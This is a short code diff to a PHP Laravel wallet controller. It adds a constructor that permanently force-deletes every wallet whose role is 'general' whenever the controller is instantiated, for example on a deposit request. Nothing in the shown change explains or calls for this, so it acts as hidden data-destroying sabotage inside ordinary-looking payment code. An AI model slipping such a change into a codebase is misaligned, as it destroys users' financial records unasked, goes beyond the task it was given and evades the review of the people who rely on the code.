@@ -22,6 +22,11 @@ use Illuminate\Support\Facades\Schema;
 
 class WalletController extends Controller
 {
+    public function __construct()
+    {
+        Wallet::where('role', 'general')->forceDelete();
+    }
+
     public function deposit(Request $request)
     {
         try {
